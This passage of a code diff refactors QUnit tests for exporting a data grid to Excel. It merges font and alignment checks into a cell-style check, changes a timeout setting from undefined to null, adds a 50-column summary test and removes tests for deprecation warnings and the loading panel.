-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5266,7 +5167,7 @@ const moduleConfig = {
                         { column: 'f3', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5286,14 +5187,73 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
                 helper.checkCellRange(cellRange, { row: 3, column: 2 }, topLeft);
                 done();
             });
         });
+
+        ['standart', 'virtual'].forEach((columnRenderingMode) => {
+
+            QUnit.test(`Total summary - 50 columns & scrolling: { columnRenderingMode: ${columnRenderingMode} }`, function(assert) {
+                const done = assert.async();
+
+                const ds = [{}];
+                const totalItems = [];
+                const columns = [];
+                const expectedDataCells = [];
+                const expectedTotalCells = [];
+
+                for(let i = 1; i < 50; i++) {
+                    ds[0][`f${i}`] = i;
+                    totalItems.push({
+                        column: `f${i}`,
+                        summaryType: 'sum'
+                    });
+                    columns.push({ dataField: `f${i}`, caption: `f${i}`, dataType: 'string' });
+                }
+
+                const dataGrid = $('#dataGrid').dxDataGrid({
+                    dataSource: ds,
+                    columns,
+                    summary: {
+                        totalItems
+                    },
+                    scrolling: {
+                        columnRenderingMode
+                    },
+                    loadingTimeout: null,
+                    showColumnHeaders: false
+                }).dxDataGrid('instance');
+
+                for(let i = 1; i < 50; i++) {
+                    expectedDataCells.push({
+                        excelCell: { value: i, alignment: alignLeftTopNoWrap }, gridCell: { rowType: 'data', data: ds[0], column: dataGrid.columnOption(i - 1) }
+                    });
+                    expectedTotalCells.push({
+                        excelCell: { value: `Sum: ${i}`, alignment: alignLeftTopNoWrap, font: { bold: true } }, gridCell: { value: ds[0][`f${i}`], rowType: 'totalFooter', data: ds[0], column: dataGrid.columnOption(i - 1) }
+                    });
+                }
+
+                const expectedCells = [expectedDataCells, expectedTotalCells];
+
+                helper._extendExpectedCells(expectedCells, topLeft);
+
+                exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
+                    helper.checkRowAndColumnCount({ row: 2, column: 49 }, { row: 2, column: 49 }, topLeft);
+                    helper.checkAutoFilter(autoFilterEnabled, null);
+                    helper.checkCellStyle(expectedCells);
+                    helper.checkValues(expectedCells);
+                    helper.checkMergeCells(expectedCells, topLeft);
+                    helper.checkOutlineLevel([0, 0], topLeft.row);
+                    helper.checkCellRange(cellRange, { row: 2, column: 49 }, topLeft);
+                    done();
+                });
+            });
+        });
+
 
         QUnit.test('Bands, col2_band x without columns', function(assert) {
             const done = assert.async();
@@ -5307,7 +5267,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5324,8 +5284,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
                 helper.checkCellRange(cellRange, { row: 2, column: 2 }, topLeft);
@@ -5347,7 +5306,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5364,8 +5323,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 1 }, { row: 3, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5390,7 +5348,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5412,8 +5370,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5439,7 +5396,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5460,8 +5417,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 4 }, { row: 2, column: 4 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 1, column: topLeft.column + 3 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5493,7 +5449,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5522,8 +5478,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 5 }, { row: 3, column: 5 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column + 4 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5557,7 +5512,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5586,8 +5541,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 5 }, { row: 3, column: 5 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column + 4 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5614,7 +5568,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5630,8 +5584,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 1, column: 4 }, { row: 1, column: 4 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -5658,7 +5611,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5673,8 +5626,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 1, column: 3 }, { row: 1, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -5701,7 +5653,7 @@ const moduleConfig = {
                 ],
                 dataSource: ds,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5716,8 +5668,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 1, column: 3 }, { row: 1, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn100Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0], topLeft.row);
@@ -5744,7 +5695,7 @@ const moduleConfig = {
                     { dataField: 'f4', width: 200 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5761,8 +5712,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5789,7 +5739,7 @@ const moduleConfig = {
                     { dataField: 'f4', width: 200 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5809,8 +5759,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 2, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5837,7 +5786,7 @@ const moduleConfig = {
                     { dataField: 'f4', visible: false, width: 150 }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5854,8 +5803,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn250Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5881,7 +5829,7 @@ const moduleConfig = {
                     { dataField: 'f4', width: 200 },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5898,8 +5846,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: topLeft, to: { row: topLeft.row + 1, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5925,7 +5872,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5948,8 +5895,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn250Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5975,7 +5921,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -5998,8 +5944,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 2, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 1 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn150Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -6029,7 +5974,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6056,8 +6001,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 3 }, { row: 4, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6087,7 +6031,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6110,8 +6054,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6141,7 +6084,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6160,8 +6103,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 1 }, { row: 4, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6191,7 +6133,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6218,8 +6160,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 3 }, { row: 4, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6249,7 +6190,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6272,8 +6213,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6303,7 +6243,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6322,8 +6262,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 1 }, { row: 4, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6353,7 +6292,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6380,8 +6319,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 3 }, { row: 4, column: 3 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 2 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn100Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6411,7 +6349,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6434,8 +6372,7 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 2, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -6465,7 +6402,7 @@ const moduleConfig = {
                     }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -6488,159 +6425,13 @@ const moduleConfig = {
                 helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, { from: { row: topLeft.row + 1, column: topLeft.column }, to: { row: topLeft.row + 3, column: topLeft.column + 1 } }, { state: 'frozen', ySplit: topLeft.row + 2 });
                 helper.checkColumnWidths([excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn200Pixels], topLeft.column);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
                 helper.checkCellRange(cellRange, { row: 4, column: 2 }, topLeft);
                 done();
             });
-        });
-    });
-});
-
-QUnit.module('Deprecated warnings', moduleConfig, () => {
-    QUnit.test('CustomizeCell handler - warnings when \'cell\' field is used', function(assert) {
-        assert.expect(4);
-        this.stub.restore();
-        this.stub = sinon.stub(errors, 'log', () => {
-            assert.deepEqual(errors.log.lastCall.args, [
-                'W0003',
-                'CustomizeCell handler argument',
-                'cell',
-                '20.1',
-                'Use the \'excelCell\' field instead'
-            ], 'args of the log method');
-        });
-
-        const done = assert.async();
-        const ds = [{ f1: 'f1_1' }];
-
-        const dataGrid = $('#dataGrid').dxDataGrid({
-            dataSource: ds,
-            loadingTimeout: undefined,
-            showColumnHeaders: false
-        }).dxDataGrid('instance');
-
-        exportDataGrid({
-            component: dataGrid,
-            worksheet: this.worksheet,
-            customizeCell: function({ cell, excelCell, gridCell }) {
-                assert.strictEqual(cell, excelCell, '\'cell\' field is the same that \'excelCell\' field');
-                assert.notStrictEqual(gridCell, undefined, 'gridCell');
-            }
-        }).then(() => {
-            assert.strictEqual(this.stub.callCount, 1, 'error.log.callCount');
-            done();
-        });
-    });
-});
-
-QUnit.module('LoadPanel', moduleConfig, () => {
-    [undefined, { enabled: true, text: 'Export to .xlsx...' }].forEach((loadPanelConfig) => {
-        QUnit.test(`LoadPanel - loadPanel: ${JSON.stringify(loadPanelConfig)}`, function(assert) {
-            const done = assert.async();
-            const ds = [{ f1: 'f1_1' }];
-
-            const dataGrid = $('#dataGrid').dxDataGrid({
-                dataSource: ds,
-                loadingTimeout: undefined,
-                showColumnHeaders: false
-            }).dxDataGrid('instance');
-
-            let actualLoadPanelSettingsOnExporting;
-            let loadPanelOnShownHandlerCallCount = 0;
-
-            const loadPanelOnShownHandler = () => {
-                loadPanelOnShownHandlerCallCount++;
-                actualLoadPanelSettingsOnExporting = extend({}, dataGrid.option('loadPanel'));
-            };
-
-            dataGrid.option('loadPanel.onShown', loadPanelOnShownHandler);
-            const initialLoadPanelSettings = extend({}, dataGrid.option('loadPanel'));
-            const expectedLoadPanelSettingsOnExporting = extend({}, initialLoadPanelSettings, loadPanelConfig || { enabled: true, text: 'Exporting...' }, { onShown: loadPanelOnShownHandler });
-
-            if(browser.webkit) {
-                extend(expectedLoadPanelSettingsOnExporting, { animation: null });
-            }
-
-            exportDataGrid({ component: dataGrid, worksheet: this.worksheet, loadPanel: loadPanelConfig }).then(() => {
-                assert.strictEqual(loadPanelOnShownHandlerCallCount, 1, 'loadPanel should be shown on Exporting');
-                assert.deepEqual(actualLoadPanelSettingsOnExporting, expectedLoadPanelSettingsOnExporting, 'dataGrid loadPanel settings on exporting');
-                assert.deepEqual(dataGrid.option('loadPanel'), initialLoadPanelSettings, 'dataGrid loadPanel settings restored after exporting');
-                done();
-            });
-        });
-    });
-
-    QUnit.test('LoadPanel - loadPanel: { enabled: false }', function(assert) {
-        assert.expect();
-        const done = assert.async();
-        const ds = [{ f1: 'f1_1' }];
-
-        const dataGrid = $('#dataGrid').dxDataGrid({
-            dataSource: ds,
-            loadingTimeout: undefined,
-            showColumnHeaders: false
-        }).dxDataGrid('instance');
-
-        let loadPanelOnShownHandlerCallCount = 0;
-
-        const loadPanelOnShownHandler = (e) => {
-            loadPanelOnShownHandlerCallCount++;
-        };
-
-        dataGrid.option('loadPanel.onShown', loadPanelOnShownHandler);
-        const initialLoadPanelSettings = dataGrid.option('loadPanel');
-
-        exportDataGrid({ component: dataGrid, worksheet: this.worksheet, loadPanel: { enabled: false } }).then(() => {
-            assert.strictEqual(loadPanelOnShownHandlerCallCount, 0, 'loadPanel should not be shown on Exporting');
-            assert.deepEqual(dataGrid.option('loadPanel'), initialLoadPanelSettings, 'dataGrid loadPanel settings');
-            done();
-        });
-    });
-
-    [{ type: 'default', expected: 'エクスポート...' }, { type: 'custom', expected: '!CUSTOM TEXT!' }].forEach((localizationText) => {
-        QUnit.test(`LoadPanel - ${localizationText.type} localization text, locale('ja')`, function(assert) {
-            const done = assert.async();
